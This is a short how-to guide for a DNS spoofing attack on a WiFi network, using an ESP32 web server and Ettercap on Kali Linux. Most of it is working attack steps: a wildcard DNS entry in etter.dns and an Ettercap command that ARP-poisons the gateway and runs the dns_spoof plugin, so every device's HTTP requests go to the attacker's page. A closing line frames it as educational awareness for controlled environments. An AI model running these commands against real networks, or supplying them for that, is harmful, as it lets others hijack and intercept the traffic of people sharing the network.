---

## 🛠️ DNS Spoofing Steps (Linux Setup Guide)

This guide outlines the steps to perform DNS spoofing using Ettercap on a Linux machine to redirect HTTP traffic to the ESP32-hosted web server.

---

### 🧰 Prerequisites:

* ESP32 flashed and running with web server code
* Arduino IDE open with serial monitor
* Kali Linux or any Linux system with:

  * `ettercap`
  * `nano` or any text editor
  * root access

---

### 🔌 Step 1: Power on the ESP32

* Plug in your ESP32 using USB
* Open **Serial Monitor** in Arduino IDE
* ESP32 will try to connect to known WiFi or create its own access point

---

### 📶 Step 2: Connect ESP32 to Target WiFi

* On your phone/laptop, connect to the ESP32 access point
* A "Configure WiFi" page will pop up
* Enter credentials of the **target WiFi network**
* ESP32 will connect and show its **local IP address** in the Serial Monitor (note this IP)

---

### 🐍 Step 3: Edit DNS Mapping in Ettercap

* Open terminal in Kali Linux

* Edit the ettercap DNS config:

  ```bash
  sudo nano /etc/ettercap/etter.dns
  ```

* Scroll to the bottom and add this line:

  ```
  *    A    <ESP32_IP>
  ```

  > Replace `<ESP32_IP>` with the IP from your Serial Monitor (e.g., `192.168.1.57`)

* Save the file: `Ctrl + O`, then `Enter`, then `Ctrl + X`

---

### 🌐 Step 4: Find Gateway IP

Run:

```bash
ip r
```

This will give output like:

```
default via 192.168.1.1 dev wlan0 ...
```

Note the **gateway IP** (e.g., `192.168.1.1`)

---

### 💣 Step 5: Start DNS Spoofing Attack

Now run Ettercap with ARP poisoning and DNS spoof plugin:

```bash
sudo ettercap -T -q -M arp:remote // <GATEWAY_IP> -P dns_spoof
```

> Example:

```bash
sudo ettercap -T -q -M arp:remote // 192.168.1.1 -P dns_spoof
```

---

### 📱 Step 6: Observe the Attack

* Any device on the same WiFi now trying to open **any HTTP website** will be redirected to the ESP32 web page
* ESP32 displays a warning and a custom message

---

### 🚫 NOTE:

* This only affects **HTTP traffic**, not **HTTPS**
* Make sure this is only used in **controlled environments** for **educational awareness purposes**

---


